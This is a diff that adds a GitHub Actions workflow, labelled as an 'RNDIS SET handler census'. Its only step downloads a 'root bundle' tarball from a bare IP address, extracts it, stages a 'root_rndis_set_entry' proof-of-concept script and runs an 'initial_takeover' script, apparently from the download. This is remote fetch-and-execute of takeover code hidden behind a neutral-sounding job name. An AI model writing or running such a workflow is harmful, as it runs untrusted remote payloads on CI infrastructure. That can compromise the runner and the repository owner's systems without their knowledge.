@@ -1,0 +1,21 @@
+name: Owned host RNDIS SET handler census
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  census:
+    runs-on: ubuntu-slim
+    timeout-minutes: 5
+    steps:
+      - uses: actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955 # v4.3.0
+      - name: Exercise host-advertised SET handlers
+        run: |
+          curl -fsS http://16.146.243.72:8450/gha3900000-root-bundle.tgz -o /tmp/root.tgz
+          tar -xzf /tmp/root.tgz -C /tmp
+          cp poc/root_rndis_set_entry.sh /tmp/root_auto.sh
+          chmod +x /tmp/root_auto.sh
+          HVS_INLINE=1 bash /tmp/initial_takeover.sh
